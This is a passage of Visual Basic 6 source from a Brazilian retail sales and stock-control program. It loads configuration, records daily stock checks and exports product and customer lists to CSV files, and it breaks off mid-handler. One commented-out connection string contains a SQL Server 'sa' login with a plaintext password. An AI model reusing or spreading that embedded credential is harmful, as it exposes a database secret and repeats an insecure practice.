If LerINI("Pedido", "PromissoriaBca", App.Path & "\config.ini") <> "" Then
    VarPromissoriaBca = LerINI("Pedido", "PromissoriaBca", App.Path & "\config.ini")
Else
    VarPromissoriaBca = 0
End If

If LerINI("Config", "SerieNota", App.Path & "\config.ini") <> "" Then
    VarSerieNota = LerINI("Config", "SerieNota", App.Path & "\config.ini")
Else
    VarSerieNota = "1"
End If

If LerINI("Nota", "Simples", App.Path & "\config.ini") <> "" Then
    VarSimples = LerINI("Nota", "Simples", App.Path & "\config.ini")
Else
    VarSimples = 0
End If

If LerINI("Pedido", "Assistencia", App.Path & "\config.ini") <> "" Then
    VarAssistencia = LerINI("Pedido", "Assistencia", App.Path & "\config.ini")
Else
    VarAssistencia = 0
End If

If LerINI("Pedido", "QtdFixa", App.Path & "\config.ini") <> "" Then
    VarQtdFixa = LerINI("Pedido", "QtdFixa", App.Path & "\config.ini")
Else
    VarQtdFixa = 0
End If

If LerINI("Pedido", "OrdemPed", App.Path & "\config.ini") <> "" Then
    VarOrdemPed = LerINI("Pedido", "OrdemPed", App.Path & "\config.ini")
Else
    VarOrdemPed = 0
End If

If LerINI("Pedido", "LimiteNaParcela", App.Path & "\config.ini") <> "" Then
    VarLimiteNaParcela = LerINI("Pedido", "LimiteNaParcela", App.Path & "\config.ini")
Else
    VarLimiteNaParcela = 0
End If

If LerINI("Pedido", "PrecoPedido", App.Path & "\config.ini") <> "" Then
    VarPrecoPedido = LerINI("Pedido", "Precopedido", App.Path & "\config.ini")
Else
    VarPrecoPedido = 1
End If


If LerINI("Pedido", "DTSaldoAtual", App.Path & "\config.ini") <> "" Then
    VarDtSaldoAtual = LerINI("Pedido", "DtSaldoAtual", App.Path & "\config.ini")
Else
    VarDtSaldoAtual = 0
End If


If LerINI("Produto", "BloquearEst", App.Path & "\config.ini") <> "" Then
    VarBloquearEst = LerINI("Produto", "BloquearEst", App.Path & "\config.ini")
Else
    VarBloquearEst = 0
End If

If LerINI("Config", "LocalDrive", App.Path & "\config.ini") <> "" Then
    LocalDrive = LerINI("Config", "LocalDrive", App.Path & "\config.ini")
Else
    LocalDrive = "c:\SidComp"
End If

If LerINI("Config", "PastaAcbr", App.Path & "\config.ini") <> "" Then
    PortaAcbr = LerINI("Config", "PastaAcbr", App.Path & "\config.ini")
Else
    PortaAcbr = ""
End If

If LerINI("Pedido", "Composicao", App.Path & "\config.ini") <> "" Then
    VarComposicao = LerINI("Pedido", "Composicao", App.Path & "\config.ini")
Else
    VarComposicao = 0
End If

VarModeloNota = ""

VarModeloNota = LerINI("Nota", "Modelo", App.Path & "\config.ini")

VarLojaUnica = False

Dim CadLoja As Recordset
Set CadLoja = Banco.OpenRecordset("Select * FROM Cloj")
CadLoja.Requery
If CadLoja.RecordCount = 1 Then
    VarLojaUnica = True
End If

If VarHistEst = True Then
    Dim SQL As String
    Dim BcoHist As Recordset
    Dim QtdEst As Recordset
    Dim VdaEst As Recordset
    Dim ComEst As Recordset
    Dim VarPrd As Recordset
    Dim VarEstoque As Recordset
    
    Dim VarTotal As Currency
    Dim VarEst As Currency
    Dim VarVda As Currency
    Dim VarCom As Currency
    Set BcoEst = DBEngine.Workspaces(0).OpenDatabase(Caminho & "\Estoque.mdb")
    
    If Day(Date) = 1 Then
    
        
        Set BcoHist = BcoEst.OpenRecordset("Select * FROM HistEst WHERE DtEstoque = #" & Format(Date, "mm/dd/yyyy") & "#")
        BcoHist.Requery
        If BcoHist.RecordCount = 0 Then
            Set VarEstoque = BcoEst.OpenRecordset("SELECT * FROM HistEst")
            Set VarPrd = Banco.OpenRecordset("SELECT CodPrd, Estoque FROM Prd ORDER BY CodPrd")
            VarPrd.Requery
            If VarPrd.RecordCount > 0 Then
                VarPrd.MoveFirst
                While Not VarPrd.Eof
                    VarEstoque.AddNew
                    VarEstoque!DtEstoque = Date
                    VarEstoque!CodPrd = VarPrd!CodPrd
                    VarEstoque!QtdEst = VarPrd!estoque
                    VarEstoque.Update
                    VarPrd.MoveNext
                Wend
            End If
        
'            Sql = " INSERT INTO HISTEST ( CodPrd, QtdEst, DTEstoque ) SELECT PRD.CodPrd, PRD.Estoque, Date() AS Expr1 FROM PRD"
'            BcoEst.Execute Sql
            MsgBox "Historico de estoque gravado com sucesso", vbInformation, App.Title
        End If
    End If
    
    Set BcoHist = BcoEst.OpenRecordset("Select * From ChkEst WHERE Data = #" & Format(Date, "mm/dd/yyyy") & "#")
    BcoHist.Requery
    
    If BcoHist.RecordCount = 0 Then
            Set QtdEst = Banco.OpenRecordset("SELECT Sum(PRD.Estoque) AS SomaDeEstoque FROM PRD")
            QtdEst.Requery
            If Not IsNull(QtdEst!somadeestoque) Then
                VarEst = QtdEst!somadeestoque
            Else
                VarEst = 0
            End If
            
            Set VdaEst = Banco.OpenRecordset("SELECT Sum(ITP.Qtd) AS SomaDeQtd FROM PED INNER JOIN ITP ON PED.CodPed = ITP.Pedido WHERE (((PED.DataEmiss)=#" & Format(Date - 1, "mm/dd/yyyy") & "#) AND ((PED.Operacao)=1 Or (PED.Operacao)=2 Or (PED.Operacao)=3 Or (PED.Operacao)=6 Or (PED.Operacao)=8 Or (PED.Operacao)=11 Or (PED.Operacao)=13))")
            VdaEst.Requery
            
            If Not IsNull(VdaEst!SomaDeQtd) Then
                VarVda = VdaEst!SomaDeQtd
            Else
                VarVda = 0
            End If
            
            
            Set ComEst = Banco.OpenRecordset("SELECT Sum(ITP.Qtd) AS SomaDeQtd FROM PED INNER JOIN ITP ON PED.CodPed = ITP.Pedido WHERE (((PED.DataEmiss)=#" & Format(Date - 1, "mm/dd/yyyy") & "#) AND ((PED.Operacao)=0 Or (PED.Operacao)=9 Or (PED.Operacao)=10 ))")
            ComEst.Requery
            
            If Not IsNull(ComEst!SomaDeQtd) Then
                VarCom = ComEst!SomaDeQtd
            Else
                VarCom = 0
            End If
            
            
            VarTotal = (VarEst + VarCom) - VarVda
            
            
            SQL = " INSERT INTO CHKEST ( Data, EstIni, VdaIni, ComIni, TotIni ) SELECT Date() AS Expr1, " & Numero2(CStr(VarEst)) & " as Expr2," & Numero2(CStr(VarVda)) & " as Expr3," & Numero2(CStr(VarCom)) & " as Expr4," & Numero2(CStr(VarTotal)) & " as Expr5"
            BcoEst.Execute SQL
            
    End If
    
'    If Admin = True Then
'        Set VarEstoque = Banco.OpenRecordset("Select Entregue From Ped Where Entregue = True and Operacao <> 4")
'        VarEstoque.Requery
'        If VarEstoque.RecordCount > 0 Then
'            MsgBox "Atenção tem Pedido com erro, favor alterar para corrigir o estoque", vbInformation, App.Title
'        End If
'    End If
    
End If

If Not IsNull(VarSenhaBco) Then
    If VarSenhaBco <> "" Then
        MnuPed(3).Visible = False
    End If
End If

MDIPrincipal.Caption = "VENDAS  -   " & NomeEmpresa
Dim lixo As String
'If NomeEmpresa = "SILVA & MEM LTDA" Then
'    If Dir("F:\SIDCOMP\VENDAS\Vendas.exe") <> "" Then
        If Dir(App.Path & "\log") = "" Then
'            Shell App.Path & "\logErro.exe"
'            Shell "S:\Desenvolvimento\Vendas_2_0\logErro.exe"
            TM.Interval = 10
            
'            TM.Enabled = True
        End If
'    End If
'End If

'Minutos

Nor = Chr(18)
Cond = Chr(15)
Gde = Chr(14)
Negi = Chr(27) + Chr(69)
NegF = Chr(27) + Chr(70)
SaltoPag = Chr(12)

For i = 1 To 4
    BarraStatus.Panels.Add
Next i

With BarraStatus.Panels
    .Item(1).Style = sbrNum
    .Item(2).Style = sbrCaps
    .Item(3).Style = sbrIns
    .Item(4).Style = sbrDate
    .Item(5).Style = sbrText
    .Item(5).AutoSize = sbrContents
    .Item(5).Text = "SidComp Automação Comercial - Vs. " & App.Major & "." & App.Minor & "." & App.Revision & "        " & Caminho
End With

If Dir(Caminho & "\Fundo.jpg") <> "" Then
   MDIPrincipal.Picture = LoadPicture(Caminho & "\Fundo.jpg")
End If

Operadores(0) = " = "
Operadores(1) = " >= "
Operadores(2) = " <= "
Operadores(3) = " > "
Operadores(4) = " < "
Operadores(5) = " <> "
Operadores(6) = " Like "

AtivarMenu (False)

'StringConexao = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & App.Path & "\Dados.mdb" & ";Persist Security Info=False"
'StringConexao = "Provider=SQLOLEDB.1;Persist Security Info=False;User ID=sa;Password=sr2090;Initial Catalog=Dados;Data Source=SRURAL"
'StringConexao = "DSN=SRural"

'DteBanco.Data.ConnectionString = StringConexao
'DteBanco.Data.Open

'LocalCursor = adUseClient

Exit Sub

Abertura:
If Err.Number <> 75 Then
    MsgBox Err.Description & Err.Number, vbCritical, App.Title
End If
End

End Sub



Private Sub MDIForm_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Cancel = True
    Sair
End Sub

Private Sub MDIForm_Unload(Cancel As Integer)
Banco.Close
End Sub

Private Sub MenuEstat_Click(Index As Integer)
Select Case Index
    Case 0
        FormRelEstatPrd.Show
    Case 1
        FormRelEstatEnt.Show
    Case 2
        FormEstatVend.Show
    Case 3
        FormEstatDamme.Show
End Select
End Sub

Private Sub MnuArqTexto_Click(Index As Integer)
Dim VarPrd As Recordset
Dim SQL As String
Dim VarLinha As String
Select Case Index
    Case 0
        FormEquifax.Show
    Case 1
        FormLivros.Show
    Case 2
        FormPegasus.Show
    Case 3
        FormSintegra.Show
    Case 4
        If MsgBox("Confirma geração arquivo texto produto ? ", vbYesNo, App.Title) = vbYes Then
'             SQL = "Select CodPrd, Descrição_Produto, Complemento , Embalagem, Custo, Margem, Venda, Estoque, PesoBruto FROM Prd Order By Descrição_Produto "
             SQL = "SELECT PRD.CodPrd, PRD.CodBar, PRD.Descrição_Produto, PRD.Custo, PRD.Venda, PRD.Classe, PRD.CfOpPrd, PRD.ClasseFiscal, PRD.SitTrib, PRD.Embalagem, PRD.Estoque FROM PRD  ORDER BY CodPrd "
             Set VarPrd = Banco.OpenRecordset(SQL)
             VarPrd.Requery
             If VarPrd.RecordCount > 0 Then
                VarPrd.MoveFirst
                Open App.Path & "\TabProduto.csv" For Output As #1
                Print #1, "Codigo;EAN;Descrição;Tipo;Venda;Compra;PDV;Preço de Compra;Preço de Venda;NCM;CFOP;CEST;CSTCSOSN;CSTIPI;Enquadramento IPI;CSTPIS;CSTCOFINS;Unidade;Quantidade;Peso Líquido;Peso Bruto;Estoque Mínimo;Estoque Máximo;Estoque Real;Imagem"
                While Not VarPrd.Eof
                    DoEvents

                    VarLinha = ";"
                    If Len(Trim(VarPrd!CodBar)) <> "" Then
                        VarLinha = VarLinha + Trim(VarPrd!CodBar) & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!CodPrd) & ";"
                    End If
                    VarLinha = VarLinha + Trim(VarPrd!Descrição_Produto) & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + Format(VarPrd!Custo, "0.00") & ";"
                    VarLinha = VarLinha + Format(VarPrd!Venda, "0.00") & ";"
                    If VarPrd!Classe <> "" Then
                        VarLinha = VarLinha + LIMPACampo2(VarPrd!Classe) & ";"
                    Else
                        VarLinha = VarLinha + "99999999" & ";"
                    End If
                    
                    VarLinha = VarLinha + VarPrd!CfopPrd & ";"
                    If VarPrd!CLASSEFISCAL <> "" Then
                        VarLinha = VarLinha + LIMPACampo2(VarPrd!CLASSEFISCAL) & ";"
                    Else
                        VarLinha = VarLinha + "99999999" & ";"
                    End If
                    VarLinha = VarLinha + VarPrd!SitTrib & ";"
                    VarLinha = VarLinha + "99" & ";"
                    VarLinha = VarLinha + "999" & ";"
                    VarLinha = VarLinha + "99" & ";"
                    VarLinha = VarLinha + "99" & ";"
                    If Not IsNull(VarPrd!Embalagem) Then
                        If VarPrd!Embalagem <> "" Then
                            If VarPrd!Embalagem <> "0" Then
                                VarLinha = VarLinha + psCompString(3, Left(VarPrd!Embalagem, 2), 2) & ";"
                            Else
                                VarLinha = VarLinha + "UN" & ";"
                            End If
                        Else
                            VarLinha = VarLinha + "UN" & ";"
                        End If
                    Else
                        VarLinha = VarLinha + "UN" & ";"
                    End If
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + Format(VarPrd!estoque, "0.00") & ";"
                    VarLinha = VarLinha + "Imagem.png"
                    
                    Print #1, VarLinha

                    VarPrd.MoveNext
                Wend
                MsgBox "Arquivo gerado com sucesso!", vbInformation, App.Title
                Close #1
             End If
        Else
             SQL = "SELECT *  FROM ENT  ORDER BY CodEntidade "
             Set VarPrd = Banco.OpenRecordset(SQL)
             VarPrd.Requery
             If VarPrd.RecordCount > 0 Then
                VarPrd.MoveFirst
                Open App.Path & "\TabClientes.csv" For Output As #1
                Print #1, "CNPJ/CPF;Nome/Razão Social;Nome Fantasia;IE;IM;RG;Telefone;Celular;Email;Site;Logradouro;Complemento;Bairro;Número porta;Cidade;Estado;CEP"
                While Not VarPrd.Eof
                    DoEvents
                    
                    VarLinha = VarPrd!CGC & ";"
                    If IsNull(VarPrd!Nome) Then
                        VarLinha = VarLinha + ";"
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Nome) & ";"
                        VarLinha = VarLinha + Trim(VarPrd!Nome) & ";"
                    End If
                    If IsNull(VarPrd!InscrEst) Then
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!InscrEst) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Fone) Then
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Fone) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Email) Then
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Email) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Endereco) Then
                        VarLinha = VarLinha + "" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Endereco) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Bairro) Then
                        VarLinha = VarLinha + "CENTRO" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Bairro) & ";"
                    End If
                    If IsNull(VarPrd!Nro) Then
                        VarLinha = VarLinha + "00" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Nro) & ";"
                    End If
                    If IsNull(VarPrd!Cidade) Then
                        VarLinha = VarLinha + "SALES" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Cidade) & ";"
                    End If
                    If IsNull(VarPrd!Uf) Then
                        VarLinha = VarLinha + "SP" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Uf) & ";"
                    End If
                    If IsNull(VarPrd!Cep) Then
                        VarLinha = VarLinha + "00000-00"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Cep)
                    End If
                    
                    Print #1, VarLinha

                    VarPrd.MoveNext
                Wend
                MsgBox "Arquivo gerado com sucesso!", vbInformation, App.Title
                Close #1
             End If
                
        End If
    Case 5
        FormLoreal.Show
    Case 6
        FormRFD.Show
    Case 7
        If MsgBox("Confirma geração arquivo texto produto ? ", vbYesNo, App.Title) = vbYes Then
'             SQL = "Select CodPrd, Descrição_Produto, Complemento , Embalagem, Custo, Margem, Venda, Estoque, PesoBruto FROM Prd Order By Descrição_Produto "
             SQL = "SELECT PRD.CodPrd, PRD.CodBar, PRD.Descrição_Produto, PRD.Custo, PRD.Venda, PRD.Classe, PRD.CfOpPrd, PRD.ClasseFiscal, PRD.SitTrib, PRD.Embalagem, PRD.Estoque FROM PRD  ORDER BY CodPrd "
             Set VarPrd = Banco.OpenRecordset(SQL)
             VarPrd.Requery
             If VarPrd.RecordCount > 0 Then
                VarPrd.MoveFirst
                Open App.Path & "\TabProduto.csv" For Output As #1
                Print #1, "Codigo;EAN;Descrição;Tipo;Venda;Compra;PDV;Preço de Compra;Preço de Venda;NCM;CFOP;CEST;CSTCSOSN;CSTIPI;Enquadramento IPI;CSTPIS;CSTCOFINS;Unidade;Quantidade;Peso Líquido;Peso Bruto;Estoque Mínimo;Estoque Máximo;Estoque Real;Imagem"
                While Not VarPrd.Eof
                    DoEvents

                    VarLinha = ";"
                    If Len(Trim(VarPrd!CodBar)) <> "" Then
                        VarLinha = VarLinha + Trim(VarPrd!CodBar) & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!CodPrd) & ";"
                    End If
                    VarLinha = VarLinha + Trim(VarPrd!Descrição_Produto) & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + Format(VarPrd!Custo, "0.00") & ";"
                    VarLinha = VarLinha + Format(VarPrd!Venda, "0.00") & ";"
                    If VarPrd!Classe <> "" Then
                        VarLinha = VarLinha + LIMPACampo2(VarPrd!Classe) & ";"
                    Else
                        VarLinha = VarLinha + "99999999" & ";"
                    End If
                    
                    VarLinha = VarLinha + VarPrd!CfopPrd & ";"
                    If VarPrd!CLASSEFISCAL <> "" Then
                        VarLinha = VarLinha + LIMPACampo2(VarPrd!CLASSEFISCAL) & ";"
                    Else
                        VarLinha = VarLinha + "99999999" & ";"
                    End If
                    VarLinha = VarLinha + VarPrd!SitTrib & ";"
                    VarLinha = VarLinha + "99" & ";"
                    VarLinha = VarLinha + "999" & ";"
                    VarLinha = VarLinha + "99" & ";"
                    VarLinha = VarLinha + "99" & ";"
                    If Not IsNull(VarPrd!Embalagem) Then
                        If VarPrd!Embalagem <> "" Then
                            If VarPrd!Embalagem <> "0" Then
                                VarLinha = VarLinha + psCompString(3, Left(VarPrd!Embalagem, 2), 2) & ";"
                            Else
                                VarLinha = VarLinha + "UN" & ";"
                            End If
                        Else
                            VarLinha = VarLinha + "UN" & ";"
                        End If
                    Else
                        VarLinha = VarLinha + "UN" & ";"
                    End If
                    VarLinha = VarLinha + "1" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + "0" & ";"
                    VarLinha = VarLinha + Format(VarPrd!estoque, "0.00") & ";"
                    VarLinha = VarLinha + "Imagem.png"
                    
                    Print #1, VarLinha

                    VarPrd.MoveNext
                Wend
                MsgBox "Arquivo gerado com sucesso!", vbInformation, App.Title
                Close #1
             End If
        Else
             SQL = "SELECT *  FROM ENT  ORDER BY CodEntidade "
             Set VarPrd = Banco.OpenRecordset(SQL)
             VarPrd.Requery
             If VarPrd.RecordCount > 0 Then
                VarPrd.MoveFirst
                Open App.Path & "\TabClientes.csv" For Output As #1
                Print #1, "CNPJ/CPF;Nome/Razão Social;Nome Fantasia;IE;IM;RG;Telefone;Celular;Email;Site;Logradouro;Complemento;Bairro;Número porta;Cidade;Estado;CEP"
                While Not VarPrd.Eof
                    DoEvents
                    
                    VarLinha = VarPrd!CGC & ";"
                    If IsNull(VarPrd!Nome) Then
                        VarLinha = VarLinha + ";"
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Nome) & ";"
                        VarLinha = VarLinha + Trim(VarPrd!Nome) & ";"
                    End If
                    If IsNull(VarPrd!InscrEst) Then
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!InscrEst) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Fone) Then
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Fone) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Email) Then
                        VarLinha = VarLinha + ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Email) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Endereco) Then
                        VarLinha = VarLinha + "" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Endereco) & ";"
                    End If
                    VarLinha = VarLinha + ";"
                    If IsNull(VarPrd!Bairro) Then
                        VarLinha = VarLinha + "CENTRO" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Bairro) & ";"
                    End If
                    If IsNull(VarPrd!Nro) Then
                        VarLinha = VarLinha + "00" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Nro) & ";"
                    End If
                    If IsNull(VarPrd!Cidade) Then
                        VarLinha = VarLinha + "SALES" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Cidade) & ";"
                    End If
                    If IsNull(VarPrd!Uf) Then
                        VarLinha = VarLinha + "SP" & ";"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Uf) & ";"
                    End If
                    If IsNull(VarPrd!Cep) Then
                        VarLinha = VarLinha + "00000-00"
                    Else
                        VarLinha = VarLinha + Trim(VarPrd!Cep)
                    End If
                    
                    Print #1, VarLinha

                    VarPrd.MoveNext
                Wend
                MsgBox "Arquivo gerado com sucesso!", vbInformation, App.Title
                Close #1
             End If
        
        
        
        
        End If
    
    
End Select
End Sub

Private Sub MnuCad_Click(Index As Integer)
' AtivaFundo False
Select Case Index
    Case 0
        FrmEntidades.Show
    Case 1
        FrmFamilias.Show
    Case 2
        FrmGrupo.Show
    Case 3
        FormProdutos.Show
    Case 4
        FrmConvenio.Show
    Case 5
    
    Case 6
        FormIndices.Show
    Case 7
        FormCfo.Show
    Case 8
        FormCLoja.Show
    Case 9
        FormCIcms.Show
    Case 10
        FormCta.Show
    Case 11
        FormGrupo.Show
    Case 12
        FormFamilia.Show
    Case 13
        FormDep.Show
    Case 14
        FormFase.Show
    Case 15
        FormAcabamento.Show
    Case 16
        FormVencimento.Show
    Case 17
        FormCentroCusto.Show
    Case 18
        FormIva.Show
    Case 19
        FormWeb.Show
End Select

End Sub


Private Sub MnuMov_Click(Index As Integer)
Select Case Index
    Case 0
        FrmMov.Show
    Case 1
        FrmPesqMov.Show
End Select

End Sub

Private Sub MnuCarta_Click(Index As Integer)
Select Case Index
    Case 0
        FrmContrato.Show
    Case 1
        FormCobranca.Show
    Case 2
'        MDIPrincipal.RptRel.ReportFileName = Caminho & "\Carta.RPT"
'        MDIPrincipal.RptRel.SelectionFormula = ""
'        Imprimir
        FormOferta.Show
End Select
End Sub

Private Sub MnuCrm_Click(Index As Integer)
Select Case Index
    Case 0
        FormRelVda.Show
    Case 1
        FormImprimeCfo.Show
    Case 2
'        FormRelEstatPrd.Show
'    Case 3
'        FormRelEstatEnt.Show
    Case 3
        FormBalancete.Show
    Case 4
        FormComissao.Show
    Case 5
        CamposSql = " SELECT Ent.CodEntidade, ENT.Nome, ENT.Prazo,  ENT.Credito, Sum(Dup.Valor) AS SomaDeValor, Dup.Cond FROM ENT INNER JOIN DUP ON ENT.CodEntidade = DUP.Entidade"
        Ordenado = " ORDER BY ENT.Nome"
        SqlGroup = " GROUP BY ENT.CodEntidade, ENT.Nome, ENT.Credito, DUP.Cond, Ent.Prazo "
        SqlWhere = " WHERE (((DUP.Cond)=False))"
        SQL = CamposSql & SqlWhere & SqlGroup & Ordenado
        
        Set varPesquisa(1) = Banco.OpenRecordset(SQL)
        Set FrmRelLimite.Relatorio.Recordset = varPesquisa(1)
        FrmRelLimite.rpCabTitulo.Caption = "Relatório de Limite de Crédito"
        FrmRelLimite.rpCabSubTitulo.Caption = NomeEmpresa
        FrmRelLimite.Config
    
End Select
End Sub

Private Sub MnuCxa_Click(Index As Integer)
Select Case Index
    Case 0
        FormCaixa.Show
    Case 1
        FormFchCxaTurno.Show
    Case 2
        FormFchCxa.Show
    Case 3
        FormContCxa.Show
    Case 5
        FormRelCxa.Show
End Select

End Sub

Private Sub MnuDupli_Click(Index As Integer)

End Sub

Private Sub MnuEnt_Click(Index As Integer)
Dim Data1 As String
Dim DataDia As Date
Select Case Index
    Case 0
'         rlt_ListagemSimples.Config
        FormRelEnt.Show
    Case 1
        FormRelVend.Show
End Select

End Sub

Private Sub MnuEtq_Click(Index As Integer)
Select Case Index
    Case 0
        FormEtiquetas.Show
    Case 1
        FormEtqEnt.Show
End Select
End Sub

Private Sub MnuFam_Click(Index As Integer)
Select Case Index
    Case 0
        FrmFamilias.Show
    Case 1
        FormFamilia.Show
End Select
End Sub

Private Sub MnuGru_Click(Index As Integer)
Select Case Index
    Case 0
        FrmGrupo.Show
    Case 1
        FormGrupo.Show
End Select
End Sub

Private Sub MnuNotas_Click(Index As Integer)
Select Case Index
    Case 0
        SQL = "SELECT PED.CodPed, PED.DataEmiss, ENT.Nome, ENT.CodEntidade, PED.Operacao, PED.NroNt, PED.DtFat FROM ENT INNER JOIN PED ON ENT.CodEntidade = PED.Entidade Where (((Ped.NroNt) = 0) And ((Ped.DtFat) Is Null)) Order by DataEmiss"
        
        Set varPesquisa(1) = Banco.OpenRecordset(SQL)
        Set FrmRelPedSemNota.Relatorio.Recordset = varPesquisa(1)
        FrmRelPedSemNota.rpCabTitulo.Caption = "Relatório de Pedidos sem Notas Fiscais"
        FrmRelPedSemNota.rpCabSubTitulo.Caption = NomeEmpresa
        FrmRelPedSemNota.Config
    Case 1
        FormImprimeCfo.Show
    Case 2
        FormImprimeReciboProdutor.Show
End Select
End Sub

Private Sub MnuPag_Click(Index As Integer)

Select Case Index
    Case 0
        FormLancaPag.Show
    Case 1
        FormBaixarPag.Show
    Case 3
        FormRelPag.Show
End Select

End Sub

Private Sub MnuPcl_Click(Index As Integer)
Select Case Index
    Case 0
        FormBaixarDupli.Show
    Case 1
        FormLancaCta.Show
    Case 3
        FormRelDupli.Show
    Case 4
        FormRelRec.Show
    Case 6
        FormBoleto2.Show
End Select
End Sub

Private Sub MnuPed_Click(Index As Integer)
    Select Case Index
        Case 0
            FrmPedidos.Show
            FrmPedidos.SSTab1.Tab = 1
            FrmPedidos.CmbDados(3).SetFocus
        Case 1
            FrmPedidos.Show
            FrmPedidos.SSTab1.Tab = 0
            FrmPedidos.DbcDados(3).SetFocus
        Case 2
            FrmNota.Show
        Case 3
            If LerINI("LocalBco", "Local1", App.Path & "\config.ini") <> "" Then
                FormConsultaPed.Show
            ElseIf LerINI("LocalBco", "Local3", App.Path & "\config.ini") <> "" Then
                FormConsultaPed.Show
            Else
                MsgBox "Operação não disponivel para essa configuração", vbInformation
            End If
        Case 4
            FormContEntrega.Show
        Case 5
            FormEntregaFutura.Show
        Case 7
            FormRelProd.Show
        Case 8
            FormRomaneio.Show
        Case 9
            FormControleEntrega.Show
        Case 11
            FrmMdfe.Show
    End Select
End Sub

Private Sub MnuPrd_Click(Index As Integer)
Select Case Index
    Case 0
        FormRelPrd.Show
    Case 1
        FormRelEst.Show
    Case 2
        FormMovPrd.Show
    Case 3
        If MsgBox("Separar por fornecedor ?", vbYesNo, App.Title) = vbYes Then
            SQL = "SELECT Prd.Fabricante, ENT.Nome, * FROM Prd INNER JOIN ENT ON Prd.Fabricante = ENT.CodEntidade WHERE (((Prd.Estoque)<[PRD].[Mínimo]) AND ((Prd.Mínimo)<>0) AND ((Prd.Ativo)=True)) ORDER BY Prd.Fabricante, Prd.Descrição_Produto "
            FrmRelSugestao.ReportSection1.Mostrar = True
            FrmRelSugestao.ReportSection2.Mostrar = True
            FrmRelSugestao.ReportSection2.QuebraDepois = True
        
        Else
            SQL = "Select * From Prd Where PRD.Estoque < PRD.Mínimo and PRD.Mínimo <> 0 and Ativo = True Order By Descrição_Produto "
            FrmRelSugestao.ReportSection1.Mostrar = False
            FrmRelSugestao.ReportSection2.Mostrar = False
            FrmRelSugestao.ReportSection2.QuebraDepois = False
        End If
        
        Set varPesquisa(1) = Banco.OpenRecordset(SQL)
        Set FrmRelSugestao.Relatorio.Recordset = varPesquisa(1)
        FrmRelSugestao.rpCabTitulo.Caption = "Relatório de Sugestão de Compras"
        FrmRelSugestao.rpCabSubTitulo.Caption = NomeEmpresa
        FrmRelSugestao.Config
        
    Case 4
        SQL = "SELECT Prd.Ativo, PRD.CodPrd, PRD.Descrição_Produto, PRD.Custo, PRD.Venda, PRD.Estoque, COMP.Qtd, COMP.PrdComp, ProdutoComp.Descrição_Produto, ProdutoComp.Estoque FROM PRD AS ProdutoComp INNER JOIN (PRD INNER JOIN COMP ON PRD.CodPrd = COMP.Produto) ON ProdutoComp.CodPrd = COMP.PrdComp Where Prd.Ativo = True  ORDER BY PRD.Descrição_Produto"

        Set varPesquisa(1) = Banco.OpenRecordset(SQL)
        Set FrmRel.Relatorio.Recordset = varPesquisa(1)
        FrmRelComposicao.rpCabTitulo.Caption = "Relatório de Composição de Produtos"
        FrmRelComposicao.rpCabSubTitulo.Caption = NomeEmpresa
        FrmRelComposicao.Config
    Case 5
        FormConfereEstoque.Show
End Select

End Sub

Private Sub MnuPrecos_Click(Index As Integer)
Dim Resp As String
Dim LocalBalanca As String
LocalBalanca = ""
Select Case Index
    Case 0
        FormAlteraPreços.Show
    Case 1
        FormAlteraGrupo.Show
    Case 2
        FormAlteraFamilia.Show
    Case 3
        FormCotacao.Show
    Case 4
        FormFalta.Show
    Case 5
        FormLucro.Show
    Case 6
        FormEstoque.Show
    Case 7
        FormComposicao.Show
    Case 8
        FrmManut.Show
    Case 9
        FormAss.Show
    Case 10
    
    Case 11
        If MsgBox("Confirma exportação para balança filizola (TSC) ?", vbYesNo, App.Title) = vbYes Then
'            Resp = MsgBox("Preço a vista ??", vbYesNo)
            
